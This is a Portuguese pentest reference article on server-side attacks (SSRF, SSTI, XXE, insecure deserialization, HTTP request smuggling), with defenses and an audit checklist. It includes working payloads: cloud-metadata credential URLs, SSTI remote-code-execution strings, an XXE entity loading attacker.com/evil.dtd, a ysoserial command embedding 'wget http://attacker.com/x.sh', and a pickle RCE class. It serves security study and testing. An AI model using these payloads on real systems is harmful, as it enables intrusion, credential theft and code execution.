---
title: Server-Side Attacks — SSRF, SSTI, XXE, Deserialization, Request Smuggling
category: auth
stack: [SSRF, SSTI, XXE, deserialization, HTTP/2]
tags: [ssrf, ssti, xxe, deserialization, smuggling, server-side]
excerpt: Ataques server-side modernos — SSRF pra cloud metadata, SSTI em template engines, deserialization e HTTP request smuggling em HTTP/2.
related: [sec-injection-attacks-deep, sec-aws-pentest, sec-redes-protocolos-2026]
updated: "2026-05-10"
---

## SSRF — Server-Side Request Forgery

App faz request HTTP a partir de input do usuário. Atacante força request pra recursos internos.

### Targets clássicos

| Target | URL |
|--------|-----|
| **AWS metadata (IMDSv1)** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name` |
| **GCP metadata** | `http://metadata.google.internal/computeMetadata/v1/` (precisa header `Metadata-Flavor: Google`) |
| **Azure metadata** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (precisa `Metadata: true`) |
| **Kubernetes API** | `https://kubernetes.default.svc/` ou `https://10.96.0.1/` |
| **Internal admin** | `http://localhost:8080/admin`, `http://10.0.0.5/jenkins` |
| **Redis sem auth** | `gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a` |
| **MySQL via gopher** | similar — exec query via gopher protocol |

### IMDSv1 vs IMDSv2

**IMDSv1** (deprecated) responde GET direto:
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
# → JSON com AccessKeyId, SecretAccessKey, Token
```

**IMDSv2** exige token PUT primeiro (anti-SSRF):
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/...
```

SSRF tradicional (só GET) **não consegue** IMDSv2 a menos que o vulnerável endpoint suporte PUT ou injection de headers. EC2 lançou IMDSv2 obrigatório em 2024 — mas legados ainda usam v1.

### Bypass de SSRF protection

```
# DNS rebinding
# Atacante registra evil.com → DNS responde 1.2.3.4 (público) na 1ª query, depois 169.254.169.254
# App valida hostname, faz request → cai no IP interno

# IP encoding
http://2130706433/         # 127.0.0.1 em decimal
http://0x7f.0.0.1/         # hex
http://0177.0.0.1/         # octal
http://127.1/              # short form
http://[::1]/              # IPv6 localhost
http://[::ffff:127.0.0.1]/ # IPv4-mapped IPv6

# Redirect chain
# App valida URL inicial mas segue redirect
http://attacker.com/redirect → 302 → http://169.254.169.254/...

# URL parser confusion
http://evil.com@169.254.169.254/   # libs old-school parsam diferente

# Scheme abuse
file:///etc/passwd
gopher://127.0.0.1:6379/_*    # Redis via gopher
dict://127.0.0.1:11211/        # memcached
ldap://127.0.0.1/
```

### SSRF blind

```bash
# Sem response visível, use OOB
# Burp Collaborator ou interactsh
TOKEN=$(interactsh-client -v)
# Inject: http://abc123.oast.fun/
# Se backend resolveu, interactsh recebe DNS
```

### Defesa

- **Bloquear ranges privados** (RFC 1918, link-local 169.254.0.0/16, loopback).
- **Validar após resolução DNS, não antes** (evita rebinding).
- **Forçar IMDSv2** em AWS.
- **Egress controls** em VPC: SG bloqueando 169.254.169.254 onde não precisa.
- **No-redirect mode** ou allowlist de redirect targets.

## SSTI — Server-Side Template Injection

Input renderizado como template. Variantes por engine:

```
# Detection — testar várias syntaxes:
{{7*7}}        # Jinja, Twig, Handlebars
${7*7}         # FreeMarker, Velocity
#{7*7}         # Ruby ERB
<%= 7*7 %>     # ERB, EJS

# Confirma com aritmética: se renderiza "49", é vuln
```

### Jinja2 (Python — Flask, Django)

```python
{{ self }}                                   # <TemplateReference> object
{{ ''.__class__.__mro__[1].__subclasses__() }}   # lista todas as classes Python
# Achar subprocess.Popen no índice X
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}
# RCE
```

Tplmap automatiza.

### Twig (PHP — Symfony)

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

### Velocity / FreeMarker (Java)

```
#set($x="")
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($chr=$x.class.forName("java.lang.Character"))
$rt.getRuntime().exec("id")
```

### Handlebars (Node)

Handlebars 4+ tem sandbox. Bypass via `lookup` ou helpers customizados.

### Defesa SSTI

- **Não renderizar input do user como template, nunca.** Renderize input como **data**.
- Se precisa renderizar (markdown user), use parser não-Turing-complete (CommonMark spec).
- Sandboxed engines (Liquid, Mustache logic-less) reduzem risco mas não eliminam.

## XXE — XML External Entity

XML parser que aceita entities externas:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Variantes

```xml
<!-- Out-of-band XXE -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- Blind XXE com error oracle -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY xxe SYSTEM 'file:///nonexistent/%data;'>">

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/...">

<!-- DoS — Billion Laughs -->
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;..."> ... &lol9; (10⁹ lols → OOM)
```

XXE existe em: SOAP, RSS feeds, SAML, DOCX/XLSX, SVG upload, configs XML.

### Defesa

```java
// Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```python
# Python — usar defusedxml
from defusedxml.ElementTree import parse
```

## Insecure Deserialization

Linguagem deserializa input em objeto. Atacante constrói payload que executa código no deserialize.

### Java — ysoserial

```bash
# Gera payload pra gadget chain (Commons Collections, Spring, etc.)
java -jar ysoserial.jar CommonsCollections5 "wget http://attacker.com/x.sh -O /tmp/x.sh" > payload.bin

# Envia onde Java aceita serialized object (RMI, T3 WebLogic, Java RMI registry)
```

### Python — pickle

```python
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# Backend: pickle.loads(user_input) → executa 'id'
```

### PHP — unserialize

Magic methods (`__wakeup`, `__destruct`) executam no deserialize. PHPGGC é o ysoserial do PHP.

### .NET — TypeNameHandling

`Newtonsoft.Json` com `TypeNameHandling.All` permite deserialize de tipo arbitrário:
```json
{ "$type": "System.Diagnostics.Process, System", ... }
```

### Defesa

- **Não deserialize input não-confiável.** Use JSON (não Java serialization, não pickle).
- Allowlist de tipos (Jackson com `@JsonTypeInfo` + allowlist).
- Integrity check (HMAC) no payload se precisa serializar pra cliente.

## HTTP Request Smuggling

Frontend (proxy/CDN/load balancer) e backend interpretam request boundaries diferente:

```http
# CL.TE attack — frontend usa Content-Length, backend usa Transfer-Encoding
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Frontend lê 13 bytes (até depois do `0\r\n\r\n`). Backend lê chunked, vê `0` como fim. `SMUGGLED` é interpretado como começo do próximo request — e atacante "anexou" headers na request da próxima vítima.

### Variantes

- **CL.TE** — Content-Length no frontend, Transfer-Encoding no backend.
- **TE.CL** — Inverso.
- **TE.TE** — Ambos suportam TE, mas com obfuscation diferente (`Transfer-Encoding: chunked` vs `Transfer-Encoding : chunked`).
- **H2.CL / H2.TE** — HTTP/2 frontend, HTTP/1.1 backend. Tradução cria a janela.

### Impacto

- Bypass de WAF (frontend bloqueia, backend processa via smuggling).
- Cache poisoning (response pra vítima vem do cache).
- Session hijack (request da vítima recebe injected headers).
- Internal endpoint access (frontend só roteia `/public/*`, smuggling alcança `/admin/*`).

### Ferramentas

- **Burp HTTP Request Smuggler** (extensão de James Kettle).
- **smuggler.py** (defparam).

## Audit checklist

- [ ] SSRF testado em todo URL/path param? Cloud metadata acessível?
- [ ] Templates renderizados com input do user? Quais engines?
- [ ] XML parsing presente (SOAP, SVG upload, SAML)? Entities desabilitados?
- [ ] Serialização Java/Python/PHP/.NET? Input controlado por user?
- [ ] HTTP/2 frontend + HTTP/1.1 backend? Smuggling testado?

## Leituras

- PortSwigger Academy: SSRF, SSTI, XXE, Deserialization, HTTP Smuggling tracks
- "Server-Side Template Injection" — James Kettle (PortSwigger)
- "HTTP Desync Attacks" — James Kettle (BlackHat 2019, 2021)
- ysoserial / PHPGGC / pickle-payload — repos de gadgets
- HackTricks: "SSRF Bypasses" e "SSTI" sections
